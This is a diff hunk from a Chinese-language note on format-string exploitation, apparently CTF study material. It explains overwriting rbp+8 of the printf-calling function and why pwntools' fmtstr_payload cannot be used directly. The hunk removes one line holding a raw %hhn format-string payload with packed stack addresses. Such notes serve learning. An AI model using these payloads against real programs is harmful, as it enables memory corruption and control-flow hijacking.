@@ -311,4 +311,3 @@ sh.interactive()
 - 格式化字符串和栈溢出字符串不一样，是需要修改调用`**printf`函数的函数**的`rbp+8`的地址（比如说调用`printf`的`fmt_attack`函数的`rbp+8`
 - 因为要覆盖改变的`rbp+8`在格式化字符串存储位置的后面，不能直接使用`fmtstr_payload`函数
 
-%99c%17$hhn%200c%18$hhn%219c%19$hhn%228c%20$hhn%233c%21$hhn%172c%22$hhnaF\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00F\x160þ\x7f\x00\x00
